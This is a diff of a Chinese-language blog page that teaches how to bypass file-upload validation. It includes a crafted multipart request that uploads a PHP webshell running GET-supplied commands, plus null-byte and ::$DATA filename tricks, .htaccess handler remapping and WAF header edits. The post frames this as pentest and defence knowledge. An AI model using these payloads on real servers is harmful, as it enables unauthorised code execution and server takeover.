@@ -166,60 +166,22 @@
   <div class="content" itemprop="articleBody">
     <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文件上传漏洞可以说是日常渗透测试用得最多的一个漏洞，因为用它获得服务器权限最快最直接。但是想真正把这个漏洞利用好却不那么容易，其中有很多技巧，也有很多需要掌握的知识。俗话说，知己知彼方能百战不殆，因此想要研究怎么防护漏洞，就要了解怎么去利用。此篇文章主要分三部分：总结一些常见的上传文件校验方式，以及绕过校验的各种姿势。</p>
 <h1 id="文件上传校验姿势"><a href="#文件上传校验姿势" class="headerlink" title="文件上传校验姿势"></a>文件上传校验姿势</h1><h2 id="客户端JavaScript校验（一般只校验后缀名）"><a href="#客户端JavaScript校验（一般只校验后缀名）" class="headerlink" title="客户端JavaScript校验（一般只校验后缀名）"></a>客户端JavaScript校验（一般只校验后缀名）</h2><p>一般都是在网页上写一段javascript脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。<br><strong>判断方式：</strong>在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。</p>
-<h2 id="服务端校验"><a href="#服务端校验" class="headerlink" title="服务端校验"></a>服务端校验</h2><h3 id="content-type字段校验"><a href="#content-type字段校验" class="headerlink" title="content-type字段校验"></a>content-type字段校验</h3><p>这里以PHP代码为例，模拟web服务器端的校验代码</p>
-<pre><code>&lt;?php
-        if($_FILES[&#39;userfile&#39;][&#39;type&#39;] != &quot;image/gif&quot;)  #这里对上传的文件类型进行判断，如果不是image/gif类型便返回错误。
-                {   
-                 echo &quot;Sorry, we only allow uploading GIF images&quot;;
-                 exit;
-                 }
-         $uploaddir = &#39;uploads/&#39;;
-         $uploadfile = $uploaddir . basename($_FILES[&#39;userfile&#39;][&#39;name&#39;]);
-         if (move_uploaded_file($_FILES[&#39;userfile&#39;][&#39;tmp_name&#39;], $uploadfile))
-        {
-                 echo &quot;File is valid, and was successfully uploaded.\n&quot;;
-            } 
-            else {
-                     echo &quot;File uploading failed.\n&quot;;
-    }
-?&gt;
-</code></pre><p>可以看到代码对上传文件的文件类型进行了判断，如果不是图片类型，返回错误。</p>
+<h2 id="服务端校验"><a href="#服务端校验" class="headerlink" title="服务端校验"></a>服务端校验</h2><h3 id="content-type字段校验"><a href="#content-type字段校验" class="headerlink" title="content-type字段校验"></a>content-type字段校验</h3><p>这里以PHP代码为例，模拟web服务器端的校验代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        if($_FILES[&apos;userfile&apos;][&apos;type&apos;] != &quot;image/gif&quot;)  #这里对上传的文件类型进行判断，如果不是image/gif类型便返回错误。</span><br><span class="line">                &#123;   </span><br><span class="line">                 echo &quot;Sorry, we only allow uploading GIF images&quot;;</span><br><span class="line">                 exit;</span><br><span class="line">                 &#125;</span><br><span class="line">         $uploaddir = &apos;uploads/&apos;;</span><br><span class="line">         $uploadfile = $uploaddir . basename($_FILES[&apos;userfile&apos;][&apos;name&apos;]);</span><br><span class="line">         if (move_uploaded_file($_FILES[&apos;userfile&apos;][&apos;tmp_name&apos;], $uploadfile))</span><br><span class="line">        &#123;</span><br><span class="line">                 echo &quot;File is valid, and was successfully uploaded.\n&quot;;</span><br><span class="line">            &#125; </span><br><span class="line">            else &#123;</span><br><span class="line">                     echo &quot;File uploading failed.\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到代码对上传文件的文件类型进行了判断，如果不是图片类型，返回错误。</p>
 <h3 id="文件头校验"><a href="#文件头校验" class="headerlink" title="文件头校验"></a>文件头校验</h3><p>可以通过自己写正则匹配，判断文件头内容是否符合要求，这里举几个常见的文件头对应关系：<br>（1） .JPEG;.JPE;.JPG，”JPGGraphic File”<br>（2） .gif，”GIF 89A”<br>（3） .zip，”Zip Compressed”<br>（4） .doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</p>
 <h1 id="文件上传绕过校验姿势"><a href="#文件上传绕过校验姿势" class="headerlink" title="文件上传绕过校验姿势"></a>文件上传绕过校验姿势</h1><h2 id="客户端绕过"><a href="#客户端绕过" class="headerlink" title="客户端绕过"></a>客户端绕过</h2><p>可以利用burp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。</p>
-<h2 id="服务端绕过"><a href="#服务端绕过" class="headerlink" title="服务端绕过"></a>服务端绕过</h2><h3 id="文件类型绕过"><a href="#文件类型绕过" class="headerlink" title="文件类型绕过"></a>文件类型绕过</h3><p>我们可以通过抓包，将content-type字段改为image/gif</p>
-<pre><code>POST /upload.php HTTP/1.1
-TE: deflate,gzip;q=0.3
-Connection: TE, close
-Host: localhost
-User-Agent: libwww-perl/5.803
-Content-Type: multipart/form-data; boundary=xYzZY
-Content-Length: 155
---xYzZY
-Content-Disposition: form-data; name=&quot;userfile&quot;; filename=&quot;shell.php&quot;
-Content-Type: image/gif (原为 Content-Type: text/plain)
-&lt;?php system($_GET[&#39;command&#39;]);?&gt;
---xYzZY-
-</code></pre><h3 id="文件头绕过"><a href="#文件头绕过" class="headerlink" title="文件头绕过"></a>文件头绕过</h3><p>在木马内容基础上再加了一些文件信息，有点像下面的结构<br>GIF89a&lt;?php phpinfo(); ?&gt;</p>
+<h2 id="服务端绕过"><a href="#服务端绕过" class="headerlink" title="服务端绕过"></a>服务端绕过</h2><h3 id="文件类型绕过"><a href="#文件类型绕过" class="headerlink" title="文件类型绕过"></a>文件类型绕过</h3><p>我们可以通过抓包，将content-type字段改为image/gif<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.php HTTP/1.1</span><br><span class="line">TE: deflate,gzip;q=0.3</span><br><span class="line">Connection: TE, close</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: libwww-perl/5.803</span><br><span class="line">Content-Type: multipart/form-data; boundary=xYzZY</span><br><span class="line">Content-Length: 155</span><br><span class="line">--xYzZY</span><br><span class="line">Content-Disposition: form-data; name=&quot;userfile&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/gif (原为 Content-Type: text/plain)</span><br><span class="line">&lt;?php system($_GET[&apos;command&apos;]);?&gt;</span><br><span class="line">--xYzZY-</span><br></pre></td></tr></table></figure></p>
+<h3 id="文件头绕过"><a href="#文件头绕过" class="headerlink" title="文件头绕过"></a>文件头绕过</h3><p>在木马内容基础上再加了一些文件信息，有点像下面的结构<br>GIF89a&lt;?php phpinfo(); ?&gt;</p>
 <h3 id="文件后缀名绕过"><a href="#文件后缀名绕过" class="headerlink" title="文件后缀名绕过"></a>文件后缀名绕过</h3><p>前提：黑名单校验<br>黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。<br>绕过方法：<br>（1）找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类<br>（2）可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类<br>能被解析的文件扩展名列表：<br>jsp jspx jspf<br>asp asa cer aspx<br>php php php3 php4<br>exe exee</p>
-<h3 id="配合文件包含漏洞"><a href="#配合文件包含漏洞" class="headerlink" title="配合文件包含漏洞"></a>配合文件包含漏洞</h3><p>前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。<br>绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）<br>（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；<br>（2）然后再上传一个.php的文件，内容为&lt;?php Include(“上传的txt文件路径”);?&gt;<br>此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：</p>
-<pre><code>#PHP    
-&lt;?php Include(&quot;上传的txt文件路径&quot;);?&gt; 
-#ASP    
-&lt;!--#include file=&quot;上传的txt文件路径&quot; --&gt;
-#JSP    
-&lt;jsp:inclde page=&quot;上传的txt文件路径&quot;/&gt;
-or  
-&lt;%@include file=&quot;上传的txt文件路径&quot;%&gt;
-</code></pre><h3 id="配合服务器解析漏洞"><a href="#配合服务器解析漏洞" class="headerlink" title="配合服务器解析漏洞"></a>配合服务器解析漏洞</h3><p><a href="http://www.cnblogs.com/shellr00t/p/6426856.html" target="_blank" rel="noopener">看这篇博客</a></p>
+<h3 id="配合文件包含漏洞"><a href="#配合文件包含漏洞" class="headerlink" title="配合文件包含漏洞"></a>配合文件包含漏洞</h3><p>前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。<br>绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）<br>（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；<br>（2）然后再上传一个.php的文件，内容为&lt;?php Include(“上传的txt文件路径”);?&gt;<br>此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#PHP    </span><br><span class="line">&lt;?php Include(&quot;上传的txt文件路径&quot;);?&gt; </span><br><span class="line">#ASP    </span><br><span class="line">&lt;!--#include file=&quot;上传的txt文件路径&quot; --&gt;</span><br><span class="line">#JSP    </span><br><span class="line">&lt;jsp:inclde page=&quot;上传的txt文件路径&quot;/&gt;</span><br><span class="line">or  </span><br><span class="line">&lt;%@include file=&quot;上传的txt文件路径&quot;%&gt;</span><br></pre></td></tr></table></figure></p>
+<h3 id="配合服务器解析漏洞"><a href="#配合服务器解析漏洞" class="headerlink" title="配合服务器解析漏洞"></a>配合服务器解析漏洞</h3><p><a href="http://www.cnblogs.com/shellr00t/p/6426856.html" target="_blank" rel="noopener">看这篇博客</a></p>
 <h3 id="配合操作系统文件命令规则"><a href="#配合操作系统文件命令规则" class="headerlink" title="配合操作系统文件命令规则"></a>配合操作系统文件命令规则</h3><ul>
 <li><p>上传不符合windows文件命名规则的文件名</p>
-<pre><code>test.asp.
-test.asp(空格)
-test.php:1.jpg
-test.php::$DATA
-shell.php::$DATA…….
-</code></pre><p>会被windows系统自动去掉不符合规则符号后面的内容。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test.asp.</span><br><span class="line">test.asp(空格)</span><br><span class="line">test.php:1.jpg</span><br><span class="line">test.php::$DATA</span><br><span class="line">shell.php::$DATA…….</span><br></pre></td></tr></table></figure>
 </li>
+</ul>
+<p>会被windows系统自动去掉不符合规则符号后面的内容。</p>
+<ul>
 <li>linux下后缀名大小写<br>在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。</li>
 </ul>
 <h3 id="CMS、编辑器漏洞"><a href="#CMS、编辑器漏洞" class="headerlink" title="CMS、编辑器漏洞"></a>CMS、编辑器漏洞</h3><ul>
@@ -229,17 +191,10 @@ shell.php::$DATA…….
 </ul>
 <h3 id="配合其他规则"><a href="#配合其他规则" class="headerlink" title="配合其他规则"></a>配合其他规则</h3><ul>
 <li><p><strong>0x00截断：</strong>基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候</p>
-<pre><code>test.php(0x00).jpg
-　test.php%00.jpg
-　路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg
-</code></pre><p>伪代码演示：</p>
-<pre><code>name= getname(httprequest) //假如这时候获取到的文件名是 help.asp.jpg(asp 后面为 0x00)
-type =gettype(name)        //而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg
-if(type == jpg)
-SaveFileToPath(UploadPath.name, name)   //但在这里却是以 0x00 作为文件名截断
-//最后以 help.asp 存入路径里
-</code></pre></li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test.php(0x00).jpg</span><br><span class="line">　test.php%00.jpg</span><br><span class="line">　路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg</span><br></pre></td></tr></table></figure>
+</li>
 </ul>
+<p>伪代码演示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name= getname(httprequest) //假如这时候获取到的文件名是 help.asp.jpg(asp 后面为 0x00)</span><br><span class="line">type =gettype(name)        //而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg</span><br><span class="line">if(type == jpg)</span><br><span class="line">   SaveFileToPath(UploadPath.name, name)   //但在这里却是以 0x00 作为文件名截断</span><br><span class="line">//最后以 help.asp 存入路径里</span><br></pre></td></tr></table></figure></p>
 <ul>
 <li><strong>.htaccesss</strong><br>上传当前目录的<code>.htaccess</code> 文件<br>例如内容为： <code>AddType application/x-http-php .jpg</code>  (上传的jpg 均以php执行)<br>把<code>.htaccess</code> 上传后，且上传成功后，再上传内容为一句话的<code>jpg</code>文件</li>
 </ul>
@@ -250,11 +205,8 @@ SaveFileToPath(UploadPath.name, name)   //但在这里却是以 0x00 作为文�
 <p>或者将filename换位置，在IIS6.0下如果我们换一种书写方式，把filename放在其他地方：<br><img src="/2019/04/06/wen-jian-shang-chuan-yi-zhi-rao-guo-zi-shi/绕过4.png" alt=""></p>
 <h4 id="POST-GET"><a href="#POST-GET" class="headerlink" title="POST/GET"></a>POST/GET</h4><p>有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。<br>此种情况可以上传一个POST型的数据包，抓包将POST改为GET。</p>
 <h4 id="利用waf本身缺陷"><a href="#利用waf本身缺陷" class="headerlink" title="利用waf本身缺陷"></a>利用waf本身缺陷</h4><p>删除实体里面的Conten-Type字段<br><img src="/2019/04/06/wen-jian-shang-chuan-yi-zhi-rao-guo-zi-shi/绕过5.png" alt=""></p>
-<p>第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。</p>
-<pre><code>正常包：Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.png&quot;Content-Type: image/png
-构造包：Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.png
-C.php&quot;
-</code></pre><p>删除Content-Disposition字段里的空格<br><img src="/2019/04/06/wen-jian-shang-chuan-yi-zhi-rao-guo-zi-shi/绕过6.png" alt=""></p>
+<p>第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">正常包：Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.png&quot;Content-Type: image/png</span><br><span class="line">构造包：Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.png</span><br><span class="line">C.php&quot;</span><br></pre></td></tr></table></figure></p>
+<p>删除Content-Disposition字段里的空格<br><img src="/2019/04/06/wen-jian-shang-chuan-yi-zhi-rao-guo-zi-shi/绕过6.png" alt=""></p>
 
   </div>
 </article>
